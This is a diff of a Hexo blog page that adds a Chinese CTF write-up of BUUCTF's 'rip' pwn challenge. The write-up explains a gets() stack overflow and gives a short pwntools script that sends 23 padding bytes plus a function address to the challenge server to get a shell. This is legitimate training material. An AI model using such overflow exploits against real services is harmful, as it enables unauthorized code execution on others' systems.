@@ -678,6 +678,14 @@
                                 <span class="chip bg-color">BUUCTF</span>
                             </a>
                         
+                            <a href="/tags/Pwn/">
+                                <span class="chip bg-color">Pwn</span>
+                            </a>
+                        
+                            <a href="/tags/WP/">
+                                <span class="chip bg-color">WP</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -710,14 +718,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-03-27
+                    2020-03-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    75
+                    247
                 </div>
                 
 
@@ -741,7 +749,31 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>上一篇写的是XCTF的wp，那这篇博客，就记录一些在BUUCTF刷题的wp；</p>
-<a id="more"></a><script>
+<a id="more"></a>
+
+<h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>这道题拿过来，还是先看保护机制：</p>
+<p><img src="/images/rip_1.png" alt="rip_1"></p>
+<p>这、这、这个什么保护都没开😂，看样子不难，丢进ida查看伪代码：</p>
+<p><img src="/images/rip_2.png" alt="rip_2"></p>
+<p>这个意思就是，先读取一个字符串，然后输出这个字符串，然后就没有啦；</p>
+<p>再看有个fun()函数，点进去：</p>
+<p><img src="/images/rip_3.png" alt="rip_3"></p>
+<p>这里可以看出，如果控制gets函数，使得输入的字符串，覆盖到fun()函数即可获取shell，这里fun()函数的地址也给了出来，直接利用；</p>
+<p>用它之前还得计算偏移量：</p>
+<p><img src="/images/rip_4.png" alt="rip_4"></p>
+<p>偏移量 = （0xF + 0x8）= 0x17</p>
+<p>这样就可以了，上exp：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26706</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">23</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>nice~~  （￣︶￣）↗　</p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -824,6 +856,14 @@
                             
                                 <a href="/tags/BUUCTF/">
                                     <span class="chip bg-color">BUUCTF</span>
+                                </a>
+                            
+                                <a href="/tags/Pwn/">
+                                    <span class="chip bg-color">Pwn</span>
+                                </a>
+                            
+                                <a href="/tags/WP/">
+                                    <span class="chip bg-color">WP</span>
                                 </a>
                             
                         </div>
@@ -1078,11 +1118,7 @@
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/HTML/" class="post-category">
-                                    HTML
-                                </a>
-                            
-                            <a href="/categories/HTML/%E5%89%8D%E7%AB%AF/" class="post-category">
+                            <a href="/categories/%E5%89%8D%E7%AB%AF/" class="post-category">
                                     前端
                                 </a>
                             
@@ -1288,7 +1324,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
                         <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
                         <br>
                         
-                            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span class="white-color">23.3k</span>&nbsp;字
+                            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span class="white-color">23.8k</span>&nbsp;字
                             
                                 
                                     
